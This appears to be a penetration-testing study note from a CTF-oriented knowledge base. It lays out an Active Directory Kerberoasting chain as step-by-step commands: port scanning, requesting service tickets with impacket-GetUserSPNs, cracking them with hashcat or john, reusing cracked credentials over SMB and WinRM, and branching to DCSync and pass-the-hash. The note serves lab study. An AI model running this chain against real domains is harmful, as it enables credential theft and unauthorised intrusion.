# AD Kerberoasting Chain

Use when AD ports are present and you have at least one valid domain credential. Soupedecode 01 follows this shape: guest SMB access -> RID/user enumeration -> valid low-priv credential -> `GetUserSPNs` -> crack service hash -> new share access -> hash reuse.

## Signals

- Ports: `53`, `88`, `389`, `445`, `464`, `3268`, `5985`.
- Domain name appears in Nmap, LDAP, SMB, RDP certs, or DNS.
- You have a user/password, user/hash, or cracked AS-REP credential.
- SPN/service accounts appear in LDAP/BloodHound/user lists.

## Main Path

```bash
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 target -Pn
nxc smb target -u user -p pass --shares
impacket-GetUserSPNs domain.local/user:pass -dc-ip target -request -outputfile kerberoast.hashes
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
john kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

After cracking:

```bash
nxc smb target -u svc_user -p 'cracked' --shares
nxc winrm target -u svc_user -p 'cracked'
smbclient //target/share -U 'domain.local\svc_user'
```

## Options To Try

- If you lack a credential, switch to [AD AS-REP Roasting Chain](AD%20AS-REP%20Roasting%20Chain.md) or [SMB Shares To Credentials](SMB%20Shares%20To%20Credentials.md).
- If `GetUserSPNs` returns nothing, enumerate LDAP/BloodHound for SPNs and service accounts.
- If hashes do not crack, test the account for accessible shares, WinRM, MSSQL, or delegated rights anyway.
- If cracking succeeds but no shell works, re-enumerate SMB shares and look for backups, scripts, hashes, or config files.
- If the cracked account can read admin backup material, branch into [AD DCSync And Pass-The-Hash Chain](AD%20DCSync%20And%20Pass-The-Hash%20Chain.md).

## Study Examples

- 0xb0b Soupedecode 01: guest SMB, RID brute, username=password check, Kerberoasting `file_svc`, backup share, pass-the-hash.
- Cajac Attacking Kerberos: Kerbrute, Kerberoasting, AS-REP roasting, tickets.
